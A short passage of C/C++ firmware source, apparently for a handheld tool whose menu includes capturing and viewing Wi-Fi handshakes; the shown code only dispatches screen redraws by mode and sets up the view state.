    if (viewIndex != lastViewIndex) { lastViewIndex = viewIndex; needsRedraw = true; }

    if (needsRedraw) {
        switch (currentMode) {
        case HS_MODE_MENU:        drawMenu(); break;
        case HS_MODE_LIST:        drawList(); break;
        case HS_MODE_CAPTURE:     drawCapture(); break;
        case HS_MODE_VIEW_LIST:   drawViewList(); break;
        case HS_MODE_VIEW_DETAIL: drawViewDetail(); break;
        case HS_MODE_SAVED_MSG:   drawSavedMsg(); break;
        default: break;
        }
        needsRedraw = false;
    }
}

void handshakeViewSetup() {
    handshakeCaptureSetup();
    currentMode = HS_MODE_VIEW_LIST;
    viewIndex = 0;
    needsRedraw = true;
}

void handshakeViewLoop() {
    handshakeCaptureLoop();
}
